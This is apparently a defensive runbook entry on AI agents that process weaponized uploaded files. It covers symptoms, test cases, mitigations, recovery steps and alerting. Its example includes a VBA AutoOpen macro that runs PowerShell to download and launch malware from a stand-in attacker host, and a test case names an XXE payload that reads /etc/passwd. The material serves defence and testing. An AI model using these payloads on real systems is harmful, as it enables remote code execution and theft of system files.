# Malicious File Handling

## Issue: Agent processes adversarial/weaponized documents or files.

**Frequency**: Common

**Symptoms**
- Unexpected scripts/macros/instructions in file.
- Agent downloads file and immediately executes or renders it (PDF, Office doc with macros).
- File contains executable content (VBA macros, embedded scripts, suspicious file extensions).
- ZIP bomb or decompression bomb: file size 100MB on disk but decompresses to 1TB.
- Agent processes DOCX/XLSX file and file metadata contains hidden instructions or malicious URLs.
- SVG or XML file contains XXE payload or embedded JavaScript.

**Root Cause**
Agent processes adversarial/weaponized documents or files.

**Example**
```
Scenario: Document processing agent extracts text from user-uploaded files.

Setup:
- Agent accepts user uploads: PDFs, Word docs, Excel sheets
- Agent processes file to extract text for analysis
- No file validation or sandboxing

Attack/Failure:
Attacker uploads: "invoice.docx"
File contains VBA macro:
Sub AutoOpen()
  Shell "powershell -Command (New-Object System.Net.WebClient).DownloadFile('http://attacker.com/malware.exe', 'malware.exe'); Start-Process malware.exe"
End Sub

Agent flow:
1. Downloads file
2. Opens with Word/Office library to extract text
3. Office macro auto-executes
4. Attacker's malware downloads and runs
5. Agent host compromised, attacker gains shell access

Impact:
- Remote code execution on agent server
- Attacker pivots to other systems on network
- Agent data (all user uploads, extracted text) accessible to attacker
- Ransomware deployment possible
```

**Contributing Factors**
- File processing uses full Office/PDF library with macro/script execution enabled.
- No file type validation; accepts any extension or content type.
- Files processed in same process/container with agent code (no sandboxing).
- File size not checked; ZIP bombs or decompression bombs can exhaust resources.
- XML files parsed with XXE (External Entity) processing enabled.
- No antivirus or static file scanning before processing.
- Error messages or logging exposes file path/content details.
- Insufficient user input validation on file uploads (no MIME type check, no content inspection).

---


## Test Scenario & Reproduction

### Scenario Setup
- Agent accepts file uploads or downloads files
- Files processed without validation
- No type checking or signature verification
- Files executed or parsed directly

### Trigger Mechanism
```
1. Attacker uploads malicious PDF disguised as text
2. Agent processes file without type validation
3. File executed or passed to vulnerable parser
4. Payload executes (code injection, file access)
5. System compromised
```

### Expected Failure State
- Malicious file processed as legitimate
- Payload executes with agent/system privileges
- System access or code execution achieved
- No file integrity or type validation

### Mitigation Validation Protocol
**Test Checklist:**
- [ ] Reproduce: Malicious file executes payload
- [ ] Apply mitigations (type checking, sandboxing)
- [ ] Re-run → file rejected or sandboxed
- [ ] Test multiple malicious formats

**Success Criteria:**
- All files validated before processing
- Type checking prevents misclassification
- Malicious files rejected or sandboxed

## Eval Recipes

### Test Cases
| Test | Input | Expected | Failure Indicator |
|------|-------|----------|-------------------|
| Macro-enabled Office document | `.docx` upload with an `AutoOpen()` VBA macro that shells out to download a payload | File processed via a macro-disabled text-extraction library; macro never executes | Macro executes, outbound download connection observed |
| ZIP/decompression bomb | 100MB compressed file that expands to 1TB | Upload rejected or capped by pre-decompression size check | Processing host exhausts disk/memory resources |
| XXE payload in XML/SVG | File contains an external entity reference to `file:///etc/passwd` | XML parser has external entity resolution disabled; reference not followed | Contents of a local file are returned in the extracted output |
| Benign PDF upload | Ordinary text-only PDF, no embedded scripts | Text extracted successfully, no execution | N/A (control case) |

### Metrics
| Metric | Target | How to Measure |
|--------|--------|----------------|
| Malicious sample detection rate (known malware corpus, e.g., EICAR + macro samples) | 100% | % of a labeled malicious-file test corpus correctly rejected/quarantined before processing |
| Macro/script execution rate during processing | 0% | % of Office/PDF files processed where any embedded macro or script actually executes |
| File-type allowlist bypass rate | 0% | % of adversarial files with spoofed extensions/MIME types that pass validation |

---

## Mitigation Strategies

### Prevention
1. **File type allowlisting**: Accept only specific file types (e.g., .pdf, .txt, .csv). Reject .exe, .docm, .xlsm, .zip, etc. Validate by magic bytes, not extension.
2. **File size limits**: Enforce strict maximum file size (e.g., 50MB). Check before processing to prevent ZIP bombs.
3. **Sandboxed file processing**: Process files in isolated container (Docker) or separate process with restricted permissions. Kills compromised process if malware runs.
4. **Macro/script disabling**: When processing Office/PDF files, explicitly disable macro execution and script evaluation. Use safe libraries (PyPDF2 for PDFs, python-pptx for presentations, not full Office).
5. **Content disarm and reconstruction (CDR)**: Convert file to safe format (PDF to PDF/A, Office doc to plaintext/PDF) before storing/processing.
6. **Antivirus scanning**: Scan all uploaded files with antivirus engine (ClamAV, VirusTotal API) before processing.
7. **XXE prevention**: When parsing XML, disable external entity resolution (XXE), DOCTYPE declarations, and entity expansion.
8. **Temporary file cleanup**: Delete all processed files immediately after extraction. Don't leave files on disk.

### Detection
- Unexpected scripts/macros/instructions in file.

### Recovery
**Immediate (Stop the Attack)**
1. Kill all agent processes immediately (SIGKILL).
2. Isolate host from network to prevent lateral movement.
3. Identify the malicious file from upload logs/MIME type.
4. Scan all uploaded files in queue for malicious signatures; quarantine suspicious files.

**Investigation (Understand Scope)**
1. Analyze the malicious file: extract payload, identify malware signature, reverse-engineer if possible.
2. Determine execution timeline: when was file uploaded, when was it processed, when did malware run?
3. Audit all processes spawned by agent during file processing (check process accounting, auditd logs).
4. Check network logs for data exfiltration or callback connections to attacker's server.
5. Review all files previously processed by agent for similar malicious content.
6. Check if other systems on the network were accessed (lateral movement indicators).

**Remediation (Prevent Recurrence)**
1. Implement file type allowlisting and sandboxing (see Prevention).
2. Scan all previous uploads in archive for malicious signatures; purge malicious files.
3. Rotate all credentials used by agent (attacker may have extracted them).
4. Update antivirus signatures to detect malware identified in attack.
5. Implement file upload monitoring and alerting (suspicious extensions, large files, antivirus failures).
6. Add security test cases with known malware samples (eicar test file, etc.) to verify antivirus integration works.
7. Review and strengthen network segmentation around agent systems.

---

## Production Signals

### Key Metrics
| Metric | Alert Threshold |
|--------|-----------------|
| Antivirus/malware-scan detections on uploads | > 0 |
| File uploads exceeding size/decompression-ratio limits | > 0 |
| Macro-enabled documents received | > 0 (should be 0 if file-type allowlist is enforced) |
| Child processes spawned during file processing | > 0 beyond the expected parser process |

### Alerts
| Alert | Condition | Severity |
|-------|-----------|----------|
| Malware Signature Detected in Upload | Antivirus/static scan flags an uploaded file before or during processing | Critical |
| Unexpected Process Spawned During File Parsing | File-processing sandbox observes a child process (shell, network client) it did not expect | Critical |
| Decompression Ratio Exceeds Threshold | Uploaded archive expands beyond the configured max decompressed size | High |

---

## References

- [OWASP-LLM-Top10](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- Note: LLM application risks including prompt injection, insecure output handling, supply chain, sensitive information disclosure, excessive agency.
